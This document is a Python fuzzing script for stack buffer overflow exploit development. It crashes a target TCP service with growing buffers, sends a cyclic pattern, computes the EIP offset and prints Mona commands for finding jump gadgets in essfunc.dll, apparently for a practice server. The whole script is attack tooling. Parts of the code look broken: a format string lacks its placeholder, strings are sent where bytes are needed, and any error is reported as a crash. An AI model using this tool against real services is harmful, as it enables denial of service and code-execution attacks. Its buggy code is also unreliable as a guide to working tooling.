#!/usr/bin/python

import socket
import os
import sys
import argparse
from time import sleep

parser = argparse.ArgumentParser(description='Socket Fuzzer')

parser.add_argument('--prefix',help='Enter the prefix for the command',required=False,dest='prefix',default="")
parser.add_argument('--target','-t',help='Enter the target host IP address',required=False,default="",dest='target')
parser.add_argument('--port','-p',help='Enter the target port number',required=False,dest='port',type=int)
parser.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
parser.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
parser.add_argument('--eip','-e',help='Enter the EIP value to identify offset code',required=False,default="",dest='eip')

args = parser.parse_args()


host=args.target
port=args.port
bufRan = ""
bufStart = 100

print ("[i] Target:\t" + args.target + ":" + str(args.port))
print ("[i] Prefix:\t" + args.prefix)
#print ("[i] ")


upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lower = "abcdefghijklmnopqrstuvwxyz"
number = "0123456789"

def find_str(s, char):
    index = 0

    if char in s:
        c = char[0]
        for ch in s:
            if ch == c:
                if s[index:index+len(char)] == char:
                    return index

            index += 1

    return -1

for u in upper:
    for l in lower:
        for n in number:
                bufRan += u + l + n

if args.fuzz:
    
    while (True):
        buffer = args.prefix.strip() + bufRan[:bufStart - 1]

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(3)
            x = s.recv(1024)
            s.send(buffer)
            s.close()
            sleep(0.5)
            bufStart += 100
        except:
            print ("[+] Server crashed at %s bytes" % str(len(buffer)))
            print ("[!] Send offset pattern using '-o' to identify EIP offset")
            sys.exit()
            
        buffer = args.prefix + bufRan[:bufStart - 1]

elif (args.offset):
    try:
        buffer = args.prefix.strip() + bufRan
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(3)
        x = s.recv(1024)
        s.send(buffer)
        s.close()
        sleep(0.5)
        bufStart += 100
    except:
        print ("[!] Check EIP for offset value" % str(len(buffer)))
        sys.exit()
        
elif (args.eip):
    offsetHex = args.eip
    offsetAscii = (bytearray.fromhex(offsetHex).decode())
    offsetPosition = find_str(bufRan,offsetAscii)
    
    if (offsetPosition == -1):
        offsetAscii = (bytearray.fromhex(offsetHex).decode())[::-1]
        offsetPosition = find_str(bufRan,offsetAscii)

    print ("[i] EIP Value: \t\t" + offsetHex)
    print ("[i] EIP Value ASCII: \t" + offsetAscii)
    print ("[+] Offset Position: \t" + str(offsetPosition))
    print ("\nNext Steps:")
    print ("[!] Locate vulnerable libraries with Mona: !mona modules")
    print ('[!] Identify valid JMP with Mona: !mona find -s "\\xff\\xe4" -m "essfunc.dll"')
    print ('[!] Identify valid PUSH RET with Mona: !mona find -s "\\x5c\\xc3" -m "essfunc.dll"')
